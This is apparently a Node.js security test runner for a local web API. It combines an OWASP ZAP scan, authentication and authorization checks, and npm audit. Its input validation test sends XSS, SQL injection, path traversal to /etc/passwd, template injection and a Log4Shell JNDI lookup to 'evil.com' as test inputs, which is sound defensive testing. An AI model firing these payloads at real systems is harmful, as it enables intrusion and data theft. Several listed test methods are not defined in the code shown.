const { spawn } = require('child_process');
const fs = require('fs');
const path = require('path');

class SecurityTestRunner {
  constructor() {
    this.zapConfigPath = path.join(__dirname, 'zap-config.yaml');
    this.reportsDir = path.join(__dirname, 'reports');
    this.zapPort = 8080;
  }

  async runSecurityTests() {
    console.log('🔒 Starting comprehensive security testing...');
    
    try {
      // Ensure reports directory exists
      if (!fs.existsSync(this.reportsDir)) {
        fs.mkdirSync(this.reportsDir, { recursive: true });
      }

      // Run OWASP ZAP automated scan
      await this.runZapScan();
      
      // Run custom security tests
      await this.runCustomSecurityTests();
      
      // Run dependency vulnerability scan
      await this.runDependencyVulnerabilityScan();
      
      // Generate consolidated report
      await this.generateConsolidatedReport();
      
      console.log('✅ Security testing completed successfully');
      
    } catch (error) {
      console.error('❌ Security testing failed:', error.message);
      process.exit(1);
    }
  }

  async runZapScan() {
    console.log('Running OWASP ZAP automated scan...');
    
    return new Promise((resolve, reject) => {
      const zapProcess = spawn('zap-baseline.py', [
        '-t', 'http://localhost:3000',
        '-c', this.zapConfigPath,
        '-J', path.join(this.reportsDir, 'zap-report.json'),
        '-H', path.join(this.reportsDir, 'zap-report.html'),
        '-x', path.join(this.reportsDir, 'zap-report.xml'),
        '-d'  // Debug mode
      ]);

      let output = '';
      let errorOutput = '';

      zapProcess.stdout.on('data', (data) => {
        output += data.toString();
        console.log(data.toString());
      });

      zapProcess.stderr.on('data', (data) => {
        errorOutput += data.toString();
        console.error(data.toString());
      });

      zapProcess.on('close', (code) => {
        if (code === 0 || code === 2) { // ZAP returns 2 for warnings
          console.log('✅ ZAP scan completed');
          resolve();
        } else {
          reject(new Error(`ZAP scan failed with code ${code}: ${errorOutput}`));
        }
      });
    });
  }

  async runCustomSecurityTests() {
    console.log('Running custom security tests...');
    
    const securityTests = [
      this.testAuthenticationSecurity,
      this.testAuthorizationSecurity,
      this.testInputValidationSecurity,
      this.testSessionManagementSecurity,
      this.testDataProtectionSecurity,
      this.testAPISecurityHeaders,
      this.testRateLimiting,
      this.testFileUploadSecurity
    ];

    const results = [];
    
    for (const test of securityTests) {
      try {
        const result = await test.call(this);
        results.push(result);
      } catch (error) {
        results.push({
          test: test.name,
          status: 'FAILED',
          error: error.message
        });
      }
    }

    // Save custom test results
    fs.writeFileSync(
      path.join(this.reportsDir, 'custom-security-tests.json'),
      JSON.stringify(results, null, 2)
    );
  }

  async testAuthenticationSecurity() {
    const axios = require('axios');
    const baseURL = 'http://localhost:3000/api/v1';
    
    const tests = [
      // Test weak password policy
      {
        name: 'Weak Password Policy',
        test: async () => {
          try {
            const response = await axios.post(`${baseURL}/auth/register`, {
              email: 'test@test.com',
              password: '123'
            });
            return response.status !== 400 ? 'VULNERABLE' : 'SECURE';
          } catch (error) {
            return error.response?.status === 400 ? 'SECURE' : 'VULNERABLE';
          }
        }
      },
      // Test brute force protection
      {
        name: 'Brute Force Protection',
        test: async () => {
          const attempts = [];
          for (let i = 0; i < 10; i++) {
            attempts.push(
              axios.post(`${baseURL}/auth/login`, {
                email: 'admin@test.com',
                password: 'wrongpassword'
              }).catch(err => err.response)
            );
          }
          
          const responses = await Promise.all(attempts);
          const lastResponse = responses[responses.length - 1];
          return lastResponse.status === 429 ? 'SECURE' : 'VULNERABLE';
        }
      }
    ];

    const results = [];
    for (const test of tests) {
      const result = await test.test();
      results.push({
        test: test.name,
        status: result,
        category: 'Authentication'
      });
    }

    return { category: 'Authentication Security', tests: results };
  }

  async testAuthorizationSecurity() {
    const axios = require('axios');
    const baseURL = 'http://localhost:3000/api/v1';
    
    // Test privilege escalation
    const userToken = await this.getUserToken();
    
    const tests = [
      {
        name: 'Admin Endpoint Access',
        test: async () => {
          try {
            const response = await axios.get(`${baseURL}/admin/users`, {
              headers: { Authorization: `Bearer ${userToken}` }
            });
            return response.status === 200 ? 'VULNERABLE' : 'SECURE';
          } catch (error) {
            return error.response?.status === 403 ? 'SECURE' : 'VULNERABLE';
          }
        }
      },
      {
        name: 'Direct Object Reference',
        test: async () => {
          try {
            const response = await axios.get(`${baseURL}/users/1`, {
              headers: { Authorization: `Bearer ${userToken}` }
            });
            return response.status === 200 ? 'VULNERABLE' : 'SECURE';
          } catch (error) {
            return error.response?.status === 403 ? 'SECURE' : 'VULNERABLE';
          }
        }
      }
    ];

    const results = [];
    for (const test of tests) {
      const result = await test.test();
      results.push({
        test: test.name,
        status: result,
        category: 'Authorization'
      });
    }

    return { category: 'Authorization Security', tests: results };
  }

  async testInputValidationSecurity() {
    const axios = require('axios');
    const baseURL = 'http://localhost:3000/api/v1';
    const token = await this.getUserToken();
    
    const maliciousInputs = [
      '<script>alert("xss")</script>',
      "'; DROP TABLE users; --",
      '../../../etc/passwd',
      '{{7*7}}',
      '${jndi:ldap://evil.com/a}'
    ];

    const results = [];
    
    for (const input of maliciousInputs) {
      try {
        const response = await axios.post(`${baseURL}/workflows`, {
          name: input,
          type: 'test'
        }, {
          headers: { Authorization: `Bearer ${token}` }
        });
        
        results.push({
          test: `Input Validation - ${input.substring(0, 20)}...`,
          status: response.data.name === input ? 'VULNERABLE' : 'SECURE',
          category: 'Input Validation'
        });
      } catch (error) {
        results.push({
          test: `Input Validation - ${input.substring(0, 20)}...`,
          status: 'SECURE',
          category: 'Input Validation'
        });
      }
    }

    return { category: 'Input Validation Security', tests: results };
  }

  async getUserToken() {
    const axios = require('axios');
    const response = await axios.post('http://localhost:3000/api/v1/auth/login', {
      email: 'user@test.com',
      password: 'TestUser123!'
    });
    return response.data.token;
  }

  async runDependencyVulnerabilityScan() {
    console.log('Running dependency vulnerability scan...');
    
    return new Promise((resolve, reject) => {
      const auditProcess = spawn('npm', ['audit', '--json'], {
        cwd: process.cwd()
      });

      let output = '';
      
      auditProcess.stdout.on('data', (data) => {
        output += data.toString();
      });

      auditProcess.on('close', (code) => {
        try {
          const auditResult = JSON.parse(output);
          fs.writeFileSync(
            path.join(this.reportsDir, 'dependency-vulnerabilities.json'),
            JSON.stringify(auditResult, null, 2)
          );
          console.log('✅ Dependency vulnerability scan completed');
          resolve();
        } catch (error) {
          console.log('✅ No dependency vulnerabilities found');
          resolve();
        }
      });
    });
  }

  async generateConsolidatedReport() {
    console.log('Generating consolidated security report...');
    
    const reports = {};
    
    // Load ZAP report
    try {
      const zapReport = JSON.parse(fs.readFileSync(path.join(this.reportsDir, 'zap-report.json')));
      reports.zap = zapReport;
    } catch (error) {
      console.warn('Could not load ZAP report');
    }
    
    // Load custom tests
    try {
      const customTests = JSON.parse(fs.readFileSync(path.join(this.reportsDir, 'custom-security-tests.json')));
      reports.customTests = customTests;
    } catch (error) {
      console.warn('Could not load custom test results');
    }
    
    // Load dependency scan
    try {
      const depScan = JSON.parse(fs.readFileSync(path.join(this.reportsDir, 'dependency-vulnerabilities.json')));
      reports.dependencies = depScan;
    } catch (error) {
      console.warn('Could not load dependency scan results');
    }
    
    // Generate summary
    const summary = this.generateSecuritySummary(reports);
    
    fs.writeFileSync(
      path.join(this.reportsDir, 'security-summary.json'),
      JSON.stringify(summary, null, 2)
    );
    
    console.log('📊 Security report generated at:', path.join(this.reportsDir, 'security-summary.json'));
  }

  generateSecuritySummary(reports) {
    return {
      timestamp: new Date().toISOString(),
      overallStatus: 'NEEDS_REVIEW',
      reports: {
        zap: reports.zap ? 'COMPLETED' : 'FAILED',
        customTests: reports.customTests ? 'COMPLETED' : 'FAILED',
        dependencies: reports.dependencies ? 'COMPLETED' : 'FAILED'
      },
      recommendations: [
        'Review all VULNERABLE findings in custom tests',
        'Address high and medium severity issues from ZAP scan',
        'Update dependencies with known vulnerabilities',
        'Implement additional security headers',
        'Enable rate limiting on all endpoints'
      ]
    };
  }
}

// Run security tests if called directly
if (require.main === module) {
  const runner = new SecurityTestRunner();
  runner.runSecurityTests();
}

module.exports = SecurityTestRunner;